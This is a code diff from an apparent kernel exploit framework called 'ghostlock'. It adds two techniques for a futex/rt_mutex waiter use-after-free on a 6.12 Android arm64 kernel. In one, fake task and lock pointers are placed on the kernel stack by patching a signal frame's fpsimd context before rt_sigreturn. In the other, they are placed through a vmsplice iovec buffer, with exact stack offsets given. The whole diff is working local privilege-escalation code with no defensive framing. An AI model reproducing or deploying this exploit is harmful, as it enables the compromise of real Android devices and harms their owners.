@@ -1,5 +1,7 @@
 #include "route/select_stack_route.h"
 
+#include <cerrno>
+#include <cstdint>
 #include <unistd.h>
 
 #include <utility>
@@ -7,6 +9,17 @@
 using namespace ghostlock;
 
 namespace ghostlock::route::select_stack {
+    /* 6.12 vmsplice wait-stack route. The profile keeps the select_stack kind
+     * (so no wire-format change) and uses compact_waiter=2 as the route-mode
+     * discriminator: the futex wait waiter is overwritten by the vmsplice
+     * iovec fast buffer, not by the pselect fd_set. */
+    constexpr uint8_t kSelectVmspliceMode = 2;
+    /* 6.12 rt_sigreturn carrier. The fpsimd_context.vregs copy lands at
+     * SP0-0x280; the futex waiter base is SP0-0x1a0, so waiter word n is
+     * carrier word 0x1c+n (28..41). The fake page still owns the write arm;
+     * the stack waiter only needs task/lock/wake and neutral tree/pi nodes. */
+    constexpr uint8_t kSelectSigreturnMode = 3;
+
     SelectStackRoute::SelectStackRoute(
         race::PiRace *race_context, const memory::WriteRequest *route_request,
         const profile::TargetProfile &profile_value,
@@ -67,6 +80,23 @@ namespace ghostlock::route::select_stack {
 
     void SelectStackRoute::disarm() noexcept {
         race->consumer_go.store(0);
+        if (layout.compact_waiter.value_or(0) == kSelectSigreturnMode) {
+            /* No syscalls here: the stale pi_blocked_on still points into this
+             * thread's kernel stack. A usleep() would overwrite the carrier
+             * while a stuck consumer may still be walking it. */
+            for (int32_t i = 0;
+                 i < 100000000 && race->consumer_inflight.load() != 0;
+                 i++) {
+#if defined(__aarch64__)
+                __asm__ volatile("yield" ::: "memory");
+#else
+                __asm__ volatile("" ::: "memory");
+#endif
+            }
+            consumer_stuck = race->consumer_inflight.load() != 0;
+            status.kernel_disarmed = !consumer_stuck;
+            return;
+        }
         if (race->consumer_inflight.load() != 0) {
             for (int32_t i = 0;
                  i < 2000 && race->consumer_inflight.load() != 0;
@@ -92,6 +122,20 @@ namespace ghostlock::route::select_stack {
     }
 
     void SelectStackRoute::destroy() noexcept {
+        /* The sigreturn carrier must not run another descriptor syscall before
+         * threads.cpp performs the ghost disarm; that would reuse the kernel
+         * stack while pi_blocked_on still points into it. */
+        if (layout.compact_waiter.value_or(0) == kSelectSigreturnMode) {
+            /* No descriptor cleanup is needed, but a stuck consumer must
+             * still be reported as a dirty race: the upper layer then exits
+             * instead of joining the wedged worker or spraying again. */
+            if (consumer_stuck) {
+                (void) fail(34, select_errno ? select_errno : ETIMEDOUT);
+                status.code = ROUTE_DIRTY_FAILURE;
+            }
+            status.userspace_clean = 1;
+            return;
+        }
         for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
             if (stdio_backup[fd].valid())
                 dup2(stdio_backup[fd].get(), static_cast<int32_t>(fd));
@@ -132,11 +176,18 @@ namespace ghostlock::route::select_stack {
 #include "common.h"
 
 #include <array>
+#include <atomic>
+#include <cstring>
 #include <ctime>
+#include <fcntl.h>
 #include <iterator>
+#include <limits>
 #include <netinet/in.h>
 #include <netinet/tcp.h>
+#include <sys/syscall.h>
 #include <sys/timerfd.h>
+#include <sys/uio.h>
+#include <ucontext.h>
 
 #include "kernel/target.h"
 #include "session/exploit_session.hpp"
@@ -152,6 +203,136 @@ namespace ghostlock::route::select_stack {
 #include "route/tcp_zerocopy_route.h"
 
 using namespace ghostlock;
+
+namespace {
+    constexpr int32_t kSigreturnCarrierSignal = 40;
+    constexpr uint32_t kFpsimdMagic = 0x46508001u;
+    constexpr uint32_t kFpsimdContextSize = 0x210u;
+    constexpr size_t kFpsimdVregsOffset = 0x10u;
+    constexpr uint32_t kEsrMagic = 0x45535201u;
+    constexpr uint32_t kSveMagic = 0x53564501u;
+    constexpr uint32_t kZaMagic = 0x54366345u;
+    constexpr uint32_t kZtMagic = 0x5a544e01u;
+    constexpr uint32_t kTpidr2Magic = 0x54504902u;
+    constexpr uint32_t kFpmrMagic = 0x46504d52u;
+    constexpr uint32_t kPoeMagic = 0x504f4530u;
+    constexpr uint32_t kExtraContextMagic = 0x45585401u;
+    /* Header-only records (size 0x10) are present on every frame on this
+     * device; a payload-bearing record means the kernel takes a different
+     * restore path and the fpsimd local may no longer be at sp+0x290. */
+    constexpr uint32_t kContextHeaderSize = 0x10u;
+    /* The waiter begins at carrier word 28; words 28..41 cover
+     * tree/pi_tree (0x00..0x4f), task (0x50), lock (0x58),
+     * wake_state (0x60) and ww_ctx (0x68). */
+    constexpr size_t kCarrierWord = 28u;
+    constexpr size_t kCarrierWords = 14u;
+
+    volatile sig_atomic_t g_sigreturn_carrier_found = 0;
+    volatile sig_atomic_t g_sigreturn_unsafe_frame = 0;
+    static_assert(std::atomic<uint64_t>::is_always_lock_free,
+                  "signal carrier words must be lock-free");
+    std::atomic<uint64_t> g_sigreturn_carrier_words[kCarrierWords];
+
+    void build_sigreturn_carrier_words() noexcept {
+        const auto &page = ghostlock::session::g_exploit_session.heap.current;
+        const uint64_t values[kCarrierWords] = {
+            0,  /* tree.parent */
+            0,  /* tree.right */
+            0,  /* tree.left */
+            1,  /* tree.prio */
+            0,  /* tree.deadline */
+            0,  /* pi_tree.parent */
+            0,  /* pi_tree.right */
+            0,  /* pi_tree.left */
+            1,  /* pi_tree.prio */
+            0,  /* pi_tree.deadline */
+            page.fake_task,
+            page.fake_lock,
+            3,  /* wake_state */
+            0,  /* ww_ctx */
+        };
+        for (size_t i = 0; i < kCarrierWords; i++) {
+            g_sigreturn_carrier_words[i].store(
+                values[i], std::memory_order_relaxed);
+        }
+    }
+
+    /* Runs on the waiter thread while returning from tgkill. The kernel has
+     * just built a valid rt_sigframe on the user stack; patching the
+     * fpsimd_context before returning makes rt_sigreturn copy our vregs onto
+     * the waiter's kernel stack at SP0-0x280.
+     *
+     * Parse the record headers instead of scanning every 4 bytes so a
+     * payload cannot be mistaken for a header. Fail closed when the frame
+     * carries a context we do not model (extra_context, or a payload-bearing
+     * SVE/SME record): arming the consumer then would walk a half-stamped
+     * waiter. */
+    void sigreturn_carrier_handler(int sig, siginfo_t *info, void *uctx) {
+        (void) info;
+        if (sig != kSigreturnCarrierSignal || uctx == nullptr) return;
+        auto *uc = static_cast<ucontext_t *>(uctx);
+        unsigned char *reserved =
+                reinterpret_cast<unsigned char *>(uc->uc_mcontext.__reserved);
+        const size_t reserved_size = sizeof(uc->uc_mcontext.__reserved);
+        const size_t no_offset = std::numeric_limits<size_t>::max();
+        size_t fpsimd_offset = no_offset;
+        bool unsafe = false;
+        size_t offset = 0;
+        while (offset + 2 * sizeof(uint32_t) <= reserved_size) {
+            uint32_t magic = 0;
+            uint32_t size = 0;
+            __builtin_memcpy(&magic, reserved + offset, sizeof(magic));
+            __builtin_memcpy(&size, reserved + offset + sizeof(magic),
+                             sizeof(size));
+            if (magic == 0 && size == 0) break;
+            if (size < 2 * sizeof(uint32_t) ||
+                size > reserved_size - offset ||
+                (size & 0xf) != 0) {
+                unsafe = true;
+                break;
+            }
+            if (magic == kFpsimdMagic) {
+                if (size != kFpsimdContextSize) {
+                    unsafe = true;
+                    break;
+                }
+                if (fpsimd_offset == no_offset) fpsimd_offset = offset;
+            } else if (magic == kExtraContextMagic) {
+                /* The fpsimd record may live in the extra page. */
+                unsafe = true;
+                break;
+            } else if (magic == kEsrMagic) {
+                if (size != kContextHeaderSize) {
+                    unsafe = true;
+                    break;
+                }
+            } else if (magic == kSveMagic || magic == kZaMagic ||
+                       magic == kZtMagic || magic == kTpidr2Magic ||
+                       magic == kFpmrMagic || magic == kPoeMagic) {
+                if (size != kContextHeaderSize) {
+                    unsafe = true;
+                    break;
+                }
+            } else {
+                unsafe = true;
+                break;
+            }
+            offset += size;
+        }
+        if (unsafe || fpsimd_offset == no_offset) {
+            g_sigreturn_unsafe_frame = unsafe ? 1 : 0;
+            return;
+        }
+        unsigned char *vregs = reserved + fpsimd_offset + kFpsimdVregsOffset;
+        for (size_t i = 0; i < kCarrierWords; i++) {
+            const uint64_t value = g_sigreturn_carrier_words[i].load(
+                std::memory_order_relaxed);
+            __builtin_memcpy(vregs + kCarrierWord * 8 + i * 8,
+                             &value, sizeof(value));
+        }
+        g_sigreturn_carrier_found = 1;
+    }
+} // namespace
 
 namespace ghostlock::route {
     static double fops_elapsed_ms(struct timespec *ref) {
@@ -362,6 +543,54 @@ namespace ghostlock::route::select_stack {
                        (session::g_exploit_session.heap.current.fake_fops));
             return fail(30, 0);
         }
+        if (layout.compact_waiter.value_or(0) == kSelectSigreturnMode) {
+            if (!(session::g_exploit_session.heap.current.fake_task) ||
+                !(session::g_exploit_session.heap.current.fake_w0)) {
+                pr_warning("sigreturn route missing fake_task=%016zx fake_w0=%016zx\n",
+                           (size_t) session::g_exploit_session.heap.current.fake_task,
+                           (size_t) session::g_exploit_session.heap.current.fake_w0);
+                return fail(31, 0);
+            }
+            build_sigreturn_carrier_words();
+            struct sigaction sa {};
+            sa.sa_sigaction = sigreturn_carrier_handler;
+            sa.sa_flags = SA_SIGINFO;
+            sigemptyset(&sa.sa_mask);
+            if (sigaction(kSigreturnCarrierSignal, &sa, nullptr) != 0) {
+                pr_warning("sigreturn route sigaction errno=%d\n", errno);
+                return fail(53, errno);
+            }
+            sigset_t unblock;
+            sigemptyset(&unblock);
+            sigaddset(&unblock, kSigreturnCarrierSignal);
+            const int32_t mask_error =
+                    pthread_sigmask(SIG_UNBLOCK, &unblock, nullptr);
+            if (mask_error != 0) {
+                pr_warning("sigreturn route pthread_sigmask err=%d\n",
+                           mask_error);
+                return fail(56, mask_error);
+            }
+            pr_info("sigreturn route prepared signal=%d fake_task=%016zx "
+                    "fake_lock=%016zx fake_w0=%016zx carrier_word=%zu\n",
+                    kSigreturnCarrierSignal,
+                    (size_t) session::g_exploit_session.heap.current.fake_task,
+                    (size_t) session::g_exploit_session.heap.current.fake_lock,
+                    (size_t) session::g_exploit_session.heap.current.fake_w0,
+                    kCarrierWord);
+            return 0;
+        }
+        if (layout.compact_waiter.value_or(0) == kSelectVmspliceMode) {
+            int32_t vfds[2];
+            if (pipe2(vfds, O_CLOEXEC) != 0) {
+                pr_warning("vmsplice route pipe2 errno=%d\n", errno);
+                return fail(50, errno);
+            }
+            pipe_read.reset(vfds[0]);
+            pipe_write.reset(vfds[1]);
+            pr_info("vmsplice route prepared pipe=%d/%d\n",
+                    pipe_read.get(), pipe_write.get());
+            return 0;
+        }
         int32_t fds[2];
         if (pipe(fds) != 0) {
             return fail(31, errno);
@@ -411,6 +640,156 @@ namespace ghostlock::route::select_stack {
     }
 
     route::RouteStatus SelectStackRoute::execute() noexcept {
+        if (layout.compact_waiter.value_or(0) == kSelectSigreturnMode) {
+            build_sigreturn_carrier_words();
+            std::atomic_signal_fence(std::memory_order_seq_cst);
+            g_sigreturn_carrier_found = 0;
+            g_sigreturn_unsafe_frame = 0;
+            race->consumer_calls.store(0);
+            race->consumer_success.store(0);
+            race->consumer_stop.store(0);
+            race->route_delay_usec.store(0);
+
+            const int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
+            /* stdout is unbuffered in this binary. Log before arming the
+             * signal; after rt_sigreturn no syscall (including a printf) may
+             * touch the waiter stack until the consumer has walked it. */
+            pr_info("sigreturn carrier arm tid=%d fake_task=%016zx "
+                    "fake_lock=%016zx fake_w0=%016zx carrier_word=%zu\n",
+                    tid,
+                    (size_t) session::g_exploit_session.heap.current.fake_task,
+                    (size_t) session::g_exploit_session.heap.current.fake_lock,
+                    (size_t) session::g_exploit_session.heap.current.fake_w0,
+                    kCarrierWord);
+            support::log_sync();
+            errno = 0;
+            const long tgkill_ret =
+                    syscall(SYS_tgkill, getpid(), tid, kSigreturnCarrierSignal);
+            const int32_t tgkill_errno = errno;
+            if (tgkill_ret != 0 || g_sigreturn_carrier_found == 0) {
+                status.userspace_clean = 1;
+                status.kernel_disarmed = 1;
+                status.code = ROUTE_FALLBACK_SAFE;
+                status.step = 54;
+                status.error_number = tgkill_errno ? tgkill_errno : EFAULT;
+                pr_warning("sigreturn carrier did not stamp errno=%d found=%d "
+                           "unsafe=%d\n", tgkill_errno,
+                           (int32_t) g_sigreturn_carrier_found,
+                           (int32_t) g_sigreturn_unsafe_frame);
+                return status;
+            }
+
+            /* tgkill returns after the handler's rt_sigreturn has copied the
+             * vregs. From here the waiter stays in userspace; the consumer
+             * may walk pi_blocked_on immediately. */
+            race->consumer_go.store(1);
+            for (int32_t spin = 0;
+                 spin < 100000000 && race->consumer_calls.load() == 0; spin++) {
+                __asm__ volatile("yield" ::: "memory");
+            }
+            race->consumer_go.store(0);
+            for (int32_t spin = 0;
+                 spin < 100000000 && race->consumer_inflight.load() != 0; spin++) {
+                __asm__ volatile("yield" ::: "memory");
+            }
+            const int32_t calls = race->consumer_calls.load();
+            const int32_t successes = race->consumer_success.load();
+            status.userspace_clean = 1;
+            status.kernel_disarmed = 1;
+            if (successes > 0) {
+                status.code = ROUTE_OK;
+                status.step = 0;
+                status.error_number = 0;
+            } else {
+                status.code = ROUTE_FALLBACK_SAFE;
+                status.step = 55;
+                status.error_number = ETIMEDOUT;
+            }
+            pr_info("sigreturn route done ret=%ld errno=%d calls=%d success=%d "
+                    "status=%d step=%d\n",
+                    tgkill_ret, tgkill_errno, calls, successes,
+                    status.code, status.step);
+            return status;
+        }
+        if (layout.compact_waiter.value_or(0) == kSelectVmspliceMode) {
+            /* 6.12 stack geometry (6.12.23-android16-5-gcd85666d7884):
+             *   __arm64_sys_vmsplice frame 0x1e0, fast iov buffer at sp+0x70
+             *   -> iov buffer start depth 0x170
+             *   futex_wait_requeue_pi waiter base depth 0x1a0
+             *   rt_mutex_waiter.task=0x50, lock=0x58
+             *   -> iovec entry 2 base/len land at waiter+0x50/+0x58.
+             * The array copy happens before rw_copy_check_uvector rejects the
+             * kernel fake pointers, so the stale waiter is overwritten even
+             * though vmsplice returns EFAULT/EINVAL. */
+            struct iovec iov[3];
+            memset(iov, 0, sizeof(iov));
+            /* entries 0/1 also cover pi_tree.right/left/prio/deadline; use
+             * the same neutral values as the select route's fake waiter. */
+            iov[0].iov_base = nullptr;
+            iov[0].iov_len = 0;
+            iov[1].iov_base = reinterpret_cast<void *>(1);
+            iov[1].iov_len = 0;
+            iov[2].iov_base = reinterpret_cast<void *>(
+                session::g_exploit_session.heap.current.fake_task);
+            iov[2].iov_len = static_cast<size_t>(
+                session::g_exploit_session.heap.current.fake_lock);
+
+            race->consumer_calls.store(0);
+            race->consumer_success.store(0);
+            race->consumer_stop.store(0);
+            race->route_delay_usec.store(0);
+
+            errno = 0;
+            const long vmsplice_ret =
+                    syscall(SYS_vmsplice, pipe_write.get(), iov, 3, 0);
+            const int32_t vmsplice_errno = errno;
+            pr_info("vmsplice route enter fake_task=%016zx fake_lock=%016zx "
+                    "ret=%ld errno=%d\n",
+                    (size_t) session::g_exploit_session.heap.current.fake_task,
+                    (size_t) session::g_exploit_session.heap.current.fake_lock,
+                    vmsplice_ret, vmsplice_errno);
+
+            race->consumer_go.store(1);
+            for (int32_t spin = 0;
+                 spin < 100000000 && race->consumer_calls.load() == 0; spin++) {
+                __asm__ volatile (
+
+
+                "yield"
+                ::: "memory");
+            }
+            race->consumer_go.store(0);
+            for (int32_t spin = 0;
+                 spin < 100000000 && race->consumer_inflight.load() != 0;
+                 spin++) {
+                __asm__ volatile("yield" ::: "memory");
+            }
+
+            const int32_t calls = race->consumer_calls.load();
+            const int32_t successes = race->consumer_success.load();
+            /* EPERM/ENOSYS means seccomp blocked the syscall before the
+             * iovec copy; never report success in that case. */
+            const bool copy_likely =
+                    (vmsplice_ret >= 0 || vmsplice_errno == EFAULT ||
+                     vmsplice_errno == EINVAL);
+            status.userspace_clean = 1;
+            status.kernel_disarmed = 1;
+            if (successes > 0 && copy_likely) {
+                status.code = ROUTE_OK;
+                status.step = 0;
+                status.error_number = 0;
+            } else {
+                status.code = ROUTE_FALLBACK_SAFE;
+                status.step = 52;
+                status.error_number = vmsplice_errno;
+            }
+            pr_info("vmsplice route done ret=%ld errno=%d calls=%d success=%d "
+                    "status=%d step=%d\n",
+                    vmsplice_ret, vmsplice_errno, calls, successes,
+                    status.code, status.step);
+            return status;
+        }
+
         struct timespec route_t0;
         clock_gettime(CLOCK_MONOTONIC, &route_t0);
 
